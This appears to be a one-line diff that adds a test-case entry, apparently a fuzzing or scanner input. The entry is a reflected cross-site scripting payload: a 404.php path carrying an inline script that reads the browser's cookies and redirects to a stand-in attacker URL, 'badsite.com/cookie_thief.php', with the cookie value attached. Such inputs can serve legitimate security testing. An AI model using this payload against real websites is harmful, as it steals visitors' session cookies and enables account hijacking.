@@ -1,0 +1,1 @@
+case04/404.php/<script>var cookie=document.cookie;var adr = "http://www.badsite.com/cookie_thief.php?cookie=";window.location=adr.concat(cookie.slice(11)) </script>
